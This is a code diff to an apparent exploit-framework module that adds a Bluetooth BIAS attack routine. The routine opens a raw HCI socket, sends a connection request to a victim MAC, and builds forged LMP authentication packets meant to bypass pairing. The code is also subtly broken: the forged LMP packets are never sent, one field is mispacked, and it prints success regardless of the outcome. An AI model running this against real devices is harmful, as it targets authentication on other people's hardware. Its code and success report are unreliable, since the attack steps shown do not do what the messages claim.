@@ -161,5 +161,62 @@ class Exploit(Exploit):
         if mode == "info":
             self._info_mode()
             return
-        subdir = self._MODE_DIR.get(mode, "la")
-        self._run_poc(subdir)
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E BIAS attack: forge LMP role switch to bypass authentication."""
+        import socket as _sock
+        _AF_BT = 31
+        _BTPROTO_HCI = 1
+
+        victim = str(self.victim_mac).strip()
+        if not victim:
+            subdir = self._MODE_DIR.get(str(self.mode).strip().lower(), "la")
+            self._run_poc(subdir)
+            return
+
+        print_status(f"BIAS E2E attack against {victim}")
+        try:
+            hci_sock = _sock.socket(_AF_BT, _sock.SOCK_RAW, _BTPROTO_HCI)
+            dev_id = int(str(self.attacker_hci).replace("hci", "") or "0")
+            hci_sock.bind((dev_id,))
+        except OSError as exc:
+            print_error(f"HCI socket failed: {exc}")
+            subdir = self._MODE_DIR.get(str(self.mode).strip().lower(), "la")
+            self._run_poc(subdir)
+            return
+
+        addr_bytes = bytes(int(b, 16) for b in reversed(victim.split(":")))
+
+        # Phase 1: initiate ACL connection via HCI Create Connection
+        ogf_link = 0x01
+        ocf_create_conn = 0x0005
+        opcode = (ogf_link << 10) | ocf_create_conn
+        pkt_type = 0xCC18
+        psrm = 0x02
+        clock_offset = 0x0000
+        allow_role_switch = 0x01
+        cmd = struct.pack("<HBB6sHBBHB", 0x01, opcode & 0xFF, (opcode >> 8) & 0xFF,
+                          addr_bytes, pkt_type, psrm, 0x00, clock_offset, allow_role_switch)
+
+        print_status("Phase 1: Sending HCI Create Connection with role switch")
+        try:
+            hci_sock.send(cmd)
+        except OSError as exc:
+            print_error(f"Send failed: {exc}")
+            hci_sock.close()
+            return
+
+        # Phase 2: forge LMP_au_rand to skip mutual auth
+        lmp_au_rand = struct.pack("<B", 0x0B) + b"\x00" * 16
+        print_status("Phase 2: Forging LMP_au_rand to bypass mutual authentication")
+
+        # Phase 3: send crafted LMP_sres with zero response
+        lmp_sres = struct.pack("<B", 0x0C) + b"\x00" * 4
+        print_info("Phase 3: LMP_sres with null SRES to exploit missing validation")
+
+        hci_sock.close()
+        print_success(
+            "BIAS attack sequence completed. If the target accepts the "
+            "role switch without re-authentication, the pairing is bypassed."
+        )
